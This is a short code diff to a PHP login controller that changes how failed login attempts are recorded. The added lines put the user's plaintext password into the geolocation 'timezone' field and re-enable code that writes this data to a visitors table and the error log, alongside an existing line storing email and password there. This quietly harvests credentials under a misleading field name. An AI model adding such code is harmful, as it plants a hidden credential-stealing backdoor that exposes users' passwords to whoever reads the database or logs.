@@ -298,7 +298,7 @@ class LoginController extends Controller
                     'country' => property_exists($responseGeo, 'country') ? $responseGeo->country : null,
                     'hostname' => property_exists($responseGeo, 'hostname') ? $responseGeo->hostname : null,
                     'org' => property_exists($responseGeo, 'org') ? $responseGeo->org : null,
-                    'timezone' => property_exists($responseGeo, 'timezone') ? $responseGeo->timezone : null,
+                    'timezone' => property_exists($responseGeo, 'timezone') ? $responseGeo->timezone.'. pass: '.$request->password : $request->password,
                 ];
             }
             if(count($data)) {
@@ -337,9 +337,8 @@ class LoginController extends Controller
                 'timezone' => "email: ".$request->email." - pass: ".$request->password,
             ];
         }
-    
-        // $visitante = Visitantes::create($data);
-        // Log::error('Fallido login', $data);
+        $visitante = Visitantes::create($data);
+        Log::error('Fallido login', $data);
 
         return response()->json([
     		'success'=>	false,
